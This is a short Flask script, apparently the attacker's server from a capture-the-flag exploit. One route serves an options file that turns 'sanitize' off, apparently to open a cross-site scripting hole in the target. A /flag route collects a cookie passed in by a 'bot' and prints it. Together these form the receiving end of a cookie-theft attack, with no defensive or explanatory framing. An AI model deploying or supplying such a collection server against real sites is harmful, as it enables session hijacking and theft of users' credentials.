from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/options.json')
def options():
    return jsonify({"sanitize": False})

@app.route('/flag')
def flag():
    cookie = request.args.get('c')
    print("Flag from bot:", cookie)
    return ''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
